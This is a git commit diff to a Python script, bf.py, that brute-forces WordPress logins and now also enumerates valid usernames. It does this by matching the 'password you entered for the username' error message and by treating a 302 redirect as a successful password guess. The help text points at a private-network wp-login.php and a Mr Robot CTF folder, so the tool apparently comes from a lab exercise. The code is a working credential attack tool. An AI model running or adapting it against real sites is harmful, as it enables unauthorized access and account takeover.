eb5a679d09757687fbf67fa262af1ad303bfa2e2
Tmpts21 <60459436+Tmpts21@users.noreply.github.com>
2021-01-08 19:15:31 +0800

    added user enumeration

--- bf.py
+++ bf.py
@@ -1,6 +1,6 @@
 import os , random , requests , time ,argparse , sys   
  
-def attempt_login( username , password , url)  :   
+def attempt_login( username , password , url , isFile )  :    
 
     try : 
         HEADERS = { 
@@ -15,21 +15,28 @@ def attempt_login( username , password , url)  :
                 'wp-submit':'Log In',  
                 }  
 
-        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False , verify = False )  
-    
-    except :    
-        print("\n*** Connection Error has occured *** "  )  
-        exit() 
+        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False , verify = False )    
 
-    return resp.status_code 
+    except :    
+        print("\n*** Connection Error has occured *** "  )    
+        exit() 
  
-def execute  () :      
-    t1 = time.time()      
+
+    if isFile and "The password you entered for the username " in resp.text :            
+        print(f'\n*** VALID USERNAME WAS FOUND *** ===> [{username}] ' ) 
+        return True 
+    
+    return resp.status_code  
+
+
+ 
+def execute  () :        
+    t1 = time.time()       
     count  = 0  
     FOUND = False       
-
     #load the files 
     File = args.passlist  
+    usernames = []  
 
     if File  :        
 
@@ -41,47 +48,68 @@ def execute  () :
         except FileNotFoundError : 
             File = args.passlist  
 
-    else : 
-        File = "passwords.txt"    
+    else :  
+        File = "passwords.txt"      
+    
+    user_enum =  os.path.isfile (args.username)         
 
-    with open(File , 'r' ) as passwords:
-        for password in passwords:     
-            count+=1    
+    if user_enum : File = args.username   
 
-            #loading 
-            sys.stdout.write("\r[+] Attacking [+] ==> tries : {0} >".format(count)) 
-            sys.stdout.flush()  
-
-            password = password.rstrip("\n" )   
-
-            #attempt login   
-            status  = attempt_login(args.username , password  , args.url )     
+    with open(File , 'r' ) as creds : 
+        for cred in creds  :    
+            count+=1      
             
+            #loading 
+            sys.stdout.write("\r[+] Attacking [+] ==> tries : {0} ".format(count)) 
+            sys.stdout.flush()    
+
+            #strip the spaces from the password   
+            cred  = cred.rstrip("\n" ) 
+
+            if user_enum : 
+                status = attempt_login(cred, "admint-test" , args.url , isFile = True ) 
+                if status == True :  
+                    FOUND = True ; usernames.append(cred)
+            else :  
+                status  = attempt_login(args.username , cred   , args.url  , isFile = False )        
+                
+
             if status == 302 :       
-                FOUND = True 
-                print(f'\n\n[+] **** PASSWORD FOUND ***** [+] =====> [{password}] for user { args.username }')           
+                print(f'\n\n[+] **** PASSWORD FOUND ***** [+] =====> [{cred}] for user { args.username }')           
                 t2 = time.time()  
                 print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
-                print(f'[-] Number of attempts : {count} [-] ' )  
-                break  
-             
-
+                print(f'[-] Number of attempts : {count} [-] ' )   
+                exit() 
+                
     if not FOUND :  
         t2 = time.time() 
-        print("\n\n[x] ***** PASSWORD NOT FOUND ***** [x]" )    
+        print("\n\n[x] ***** NO VALID USERNAME FOUND ***** [x]" )    
         print("[-] Try another password list [-] " )  
         print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
-        print(f'[-] Number of attempts : {count} [-] ' )  
+        print(f'[-] Number of attempts : {count} [-] ' )   
+    else :   
+        print("\n\n[x] *** List of valid usernames *** [x]\n")   
+        for i in usernames : 
+            print (f'{" " * 9 } [+] "{i}" [+] ')
+
 
 
 def main () :   
-    global args 
+    global args   
+    help_message =  """  
+            Usage :  \n 
+            brute force with valid username :  \n  
+            python3 bf.py -t http://192.168.254.107/wp-login.php  -u elliot -p /home/mivatampos/ctf/mr_robot_1/test.txt  \n 
+            Enumerate users ( just dont provide the -p flag it will use the default "admin" password to attempt the login : \n 
+            python3 bf.py -t http://192.168.254.107/wp-login.php  -u usernames.txt 
+            """ 
+    print(help_message) 
+
     #parser
     parser = argparse.ArgumentParser()
-    parser.add_argument("-u", "--username", help="valid username" )
+    parser.add_argument("-u", "--username", help="valid username or file "  )
     parser.add_argument("-t", "--url", help="url/target to attack  ")
-    parser.add_argument("-p", "--passlist", help="password list address ")
-     
+    parser.add_argument("-p", "--passlist", help="password list address ") 
     args = parser.parse_args()       
 
     print(""" 
